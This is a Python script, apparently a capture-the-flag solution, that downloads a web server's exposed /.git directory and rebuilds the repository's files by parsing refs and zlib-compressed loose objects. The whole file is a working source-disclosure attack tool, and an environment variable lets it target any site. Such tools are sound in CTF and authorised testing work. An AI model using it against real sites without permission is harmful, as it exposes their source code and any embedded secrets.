#!/usr/bin/env python
"""VecNet: /.git is world-readable, so rebuild the repository instead of guessing routes.

Only the loose-object path is implemented first (a 10-line zlib parse of
`<type> <len>\\0<content>` plus the tree entry format `<mode> <name>\\0<20 raw sha>`); if the
objects turn out to be packed, the walker reports that and the packfile route is the next step.
Nothing clever about it - the point is to get the real router source rather than keep probing
a uniform 403.
"""
import os
import sys
import urllib.error
import urllib.request
import zlib

BASE = os.environ.get("GITBASE", "http://vec.web.2026.sunshinectf.games:8000")
OUT = sys.argv[1] if len(sys.argv) > 1 else "files/repo"
N = [0]


def fetch(path):
    N[0] += 1
    try:
        req = urllib.request.Request(BASE + path, headers={"User-Agent": "git-dump"})
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.read()
    except urllib.error.HTTPError as e:
        return None
    except Exception:
        return None


def obj(sha):
    raw = fetch("/.git/objects/%s/%s" % (sha[:2], sha[2:]))
    if raw is None:
        return None
    data = zlib.decompress(raw)
    head, body = data.split(b"\0", 1)
    typ, _ = head.split(b" ", 1)
    return typ.decode(), body


def tree(sha, base):
    typ, body = obj(sha)
    assert typ == "tree", typ
    out = []
    i = 0
    while i < len(body):
        sp = body.index(b" ", i)
        mode = body[i:sp].decode()
        nl = body.index(b"\0", sp)
        name = body[sp + 1:nl].decode("utf-8", "replace")
        entry = body[nl + 1:nl + 21].hex()
        i = nl + 21
        out.append((mode, name, entry))
    for mode, name, sha2 in out:
        if mode == "40000":
            print("[d] %s/%s" % (base, name), flush=True)
            tree(sha2, base + "/" + name)
        else:
            t, content = obj(sha2)
            if t != "blob":
                print("[?] %s/%s is %s" % (base, name, t))
                continue
            p = os.path.join(OUT, base.lstrip("/"), name) if base else os.path.join(OUT, name)
            os.makedirs(os.path.dirname(p), exist_ok=True)
            open(p, "wb").write(content)
            print("[f] %-46s %6d bytes" % (base + "/" + name, len(content)), flush=True)


def main():
    head = fetch("/.git/HEAD")
    if not head:
        sys.exit("[-] no /.git/HEAD")
    print("[*] HEAD:", head.strip().decode())
    ref = head.strip().decode().split("ref: ", 1)
    if len(ref) == 2:
        sha = fetch("/.git/" + ref[1])
        if sha is None:
            pr = fetch("/.git/packed-refs")
            print("[*] trying packed-refs")
            sha = b""
            if pr:
                for line in pr.decode().splitlines():
                    if line and not line.startswith("^") and ref[1].endswith(line.split()[-1]):
                        sha = line.split()[0].encode()
        sha = sha.decode().strip()
    else:
        sha = ref[0].strip()
    print("[*] commit:", sha)
    if obj(sha) is None:
        print("[-] loose object missing -> repository is packed; need /.git/objects/pack/*")
        for cand in ["/.git/objects/pack/pack.idx", "/.git/objects/info/packs"]:
            print("   ", cand, "len", len(fetch(cand) or b""))
        return
    typ, body = obj(sha)
    print("[*] commit object:", typ)
    print(body.decode("latin-1")[:800])
    tree_sha = [l.split()[1] for l in body.decode().splitlines() if l.startswith("tree ")][0]
    os.makedirs(OUT, exist_ok=True)
    tree(tree_sha, "")


if __name__ == "__main__":
    main()
    print("[*] %d requests" % N[0])
